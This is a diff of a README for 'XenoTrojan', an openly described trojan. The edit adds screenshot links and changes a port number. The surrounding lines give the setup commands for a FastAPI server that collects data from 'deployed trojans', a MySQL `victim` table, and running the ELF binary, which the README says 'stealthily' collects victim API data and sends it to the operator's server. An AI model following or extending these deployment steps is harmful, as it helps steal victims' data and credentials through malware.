@@ -61,6 +61,8 @@ To deploy the FastAPI server on your VPS, execute the following command:
 nohup uvicorn main:app --host 0.0.0.0 --port 3333 > fastapi.log 2>&1 &
 ```
 
+![alt text](img/install.png)
+
 This command starts the FastAPI server to handle incoming API requests from deployed trojans.
 
 ## Database Setup
@@ -75,6 +77,8 @@ CREATE TABLE `victim` (
   PRIMARY KEY (`id`)
 );
 ```
+![alt text](img/mysql.png)
+
 
 Update the `config.cfg.example` file with your database credentials:
 
@@ -113,6 +117,8 @@ Run the compiled XenoTrojan ELF executable:
 ```bash
 ./XenoTrojan
 ```
+![alt text](img/cli.png)
+
 
 XenoTrojan will stealthily collect victim API data and transmit it securely to your FastAPI server.
 
@@ -180,7 +186,7 @@ async def register_ip(record: IPRecord):
 
 if __name__ == "__main__":
     import uvicorn
-    uvicorn.run(app, host="0.0.0.0", port=3993)
+    uvicorn.run(app, host="0.0.0.0", port=3333)
 ```
 
 ## Main Part of XenoTrojan C++ Code Explanation
